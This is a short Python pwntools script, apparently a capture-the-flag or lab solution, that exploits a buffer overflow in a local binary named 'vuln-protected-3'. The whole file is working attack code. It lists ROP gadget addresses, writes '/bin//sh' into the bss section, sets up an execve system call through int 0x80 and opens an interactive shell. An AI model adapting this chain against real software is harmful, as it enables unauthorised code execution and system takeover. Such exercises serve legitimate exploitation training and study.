#!/usr/bin/env python3

from pwn import *


############### IN USAGE ## #################
# 0x080793c4 : mov dword ptr [eax], edx ; ret
# 0x08065abe : pop edx ; pop ebx ; pop esi ; ret
# 0x0805bf75 : pop ebp ; mov eax, edx ; ret 
# 0x08063ca1 : pop ecx ; add al, 0xf6 ; ret
# 0x0804a6c2 : int 0x80 


def set_edx_ebx(edx,ebx):
    return p32(0x08065abe) + p32(edx) + p32(ebx) + p32(0xfadeface) 

def write_to_mem(addr, val):
    return set_eax(addr) + set_edx_ebx(val,0xfadeface) + p32(0x080793c4)

def set_eax(val):  
    return set_edx_ebx(val,0x0) + p32(0x0805bf75) + p32(0xfadeface)

def set_ecx(val):
    return p32(0x08063ca1) + p32(val)

def int80():
    return p32(0x0804a6c2)

#addres in bss section
buffor = 0x80e8144

shellcode = b''.join([
    b"A" * 28,
    write_to_mem(buffor, u32("/bin")),
    write_to_mem(buffor + 4, u32("//sh")),
    set_ecx(0x0),
    set_eax(0x0b),
    set_edx_ebx(0x0, buffor),
    int80()
])

p = process('./vuln-protected-3')

p.sendline(b"")
p.sendline(shellcode)

p.interactive()
